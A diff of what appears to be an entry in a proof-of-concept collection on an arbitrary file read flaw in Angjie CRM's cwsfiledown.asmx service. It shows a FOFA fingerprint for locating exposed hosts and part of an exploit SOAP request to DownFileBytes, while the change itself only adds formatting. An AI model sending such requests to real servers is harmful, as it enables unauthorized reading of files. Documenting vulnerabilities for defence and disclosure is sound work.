@@ -81,6 +81,9 @@ FOFA：body="/ClientBin/slEnjoy.App.xap"
 
 POC/EXP：
 
+> 排版说明：以下按归档原样展示，XML 行中已有的 Markdown 反引号也予以保留；未据此重写 SOAP 报文。
+
+```text
 POST /EnjoyRMIS_WS/WS/FileDown/cwsfiledown.asmx HTTP/1.1
 Host: 127.0.0.1
 Content-Type: text/xml; charset=utf-8
@@ -98,6 +101,7 @@ SOAPAction: "http://tempuri.org/DownFileBytes"
     `</DownFileBytes>`
   </soap:Body>
 </soap:Envelope>
+```
 
 ![image-20241127222148486](./.resource/昂捷CRMcwsfiledown.asmx任意文件读取漏洞/media/image-20241127222148486.png)
 
